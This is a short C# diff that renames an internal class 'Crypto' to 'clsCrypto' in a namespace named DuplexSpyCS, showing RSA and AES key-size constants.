@@ -4,7 +4,7 @@ using System.Security.Cryptography;
 
 namespace DuplexSpyCS
 {
-    internal class Crypto
+    internal class clsCrypto
     {
         static int rsa_keySize = 4096;
         static int aes_keySize = 256;
